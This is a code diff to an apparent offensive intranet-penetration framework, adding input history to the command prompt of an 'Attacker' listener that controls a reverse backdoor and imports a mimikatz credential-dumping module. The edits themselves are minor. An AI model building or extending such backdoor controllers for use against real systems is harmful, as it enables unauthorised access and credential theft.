@@ -6,6 +6,7 @@ import socket
 from prompt_toolkit import prompt
 from prompt_toolkit.completion import WordCompleter
 from prompt_toolkit.formatted_text import ANSI
+from prompt_toolkit.history import InMemoryHistory
 
 sys.path.append(os.path.dirname(os.path.realpath(__file__)))
 from IntranetPenetration.mimikatz import mimikatz
@@ -29,8 +30,6 @@ class Attacker(threading.Thread):
             serverSocket.listen(10)
         except socket.error as message:
             print(message)
-        except KeyboardInterrupt:
-            print("exiting......")
         self.conn, self.addr = serverSocket.accept()
         self.ip = self.addr[0]  # ip地址
 
@@ -70,11 +69,12 @@ class Attacker(threading.Thread):
         completer = WordCompleter(commands)
         formatted_text1 = ANSI(
             '\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor] \033[0m')
+        history = InMemoryHistory()
         print('\033[1;32;32m' + "[+] The reverse backdoor has been successfully launched!" + '\033[0m')
         print('\033[1;32;32m' + "[+] Type \"show functions\" to learn more details." + '\033[0m')
         while True:
             try:
-                command = prompt(formatted_text1, completer=completer)
+                command = prompt(formatted_text1, completer=completer, history=history)
                 if command.lower() == 'show functions':
                     self.show_functions()
                     print('\033[1;34;34m' + "[*] Select the serial number to enter the function module." + '\033[0m')
